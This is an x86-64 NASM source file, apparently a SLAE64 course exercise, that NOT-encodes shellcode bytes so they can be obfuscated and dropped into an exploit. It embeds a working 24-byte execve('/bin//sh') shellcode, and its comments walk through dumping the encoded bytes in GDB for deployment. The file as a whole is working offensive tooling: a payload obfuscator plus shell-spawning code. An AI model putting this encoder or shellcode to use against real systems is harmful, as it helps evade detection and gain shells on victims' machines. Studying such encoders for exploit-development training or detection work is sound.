;
; Filename: not-encoder.nasm
; Author: Gitsnik SLAE64-1232
; Website: http://dracyrys.com/
;
; Purpose:
;	Provide two way NOT encoding of shellcode bytes.
;
; This is both the encode and decode program, I have split them separately
; to make the process more obvious. Regardless, put in clean shellcode and compile
; then dump the hex out and drop it into a -ggdb compiled shellcode-tester.c
;
; When running the program in GDB you will reach a breakpoint (int 0x03) at which
; time you can dump the encoded shellcode bytes by typing:
;
; x/24xb $rsi
;
; Where 24 is the codelen.
;
; The bytes stored in rsi are your encoded shellcode bytes, which may be dropped into
; the nasm shellcode variable, compiled, and get-sh.sh for deployment into an
; exploit.
;
; The sample shellcode here is my 24 byte execve() shellcode.
;
bits 64
global _start

section .text

_start:

	jmp short callmain
main:
	xor rcx, rcx
	mul rcx

	pop rsi
	lea rdi, [rsi]

	mov cl, codelen

encode:
	mov bl, byte [rsi + rax]
	not bl
	mov byte [rdi], bl

	inc rdi
	inc rax

	dec rcx
	jnz encode

	int 0x03

	jmp short shellcode

callmain:
	call main

	shellcode: db 0x6a,0x3b,0x58,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x99,0x52,0x53,0x54,0x5f,0x52,0x57,0x54,0x5e,0x0f,0x05
	codelen equ $-shellcode
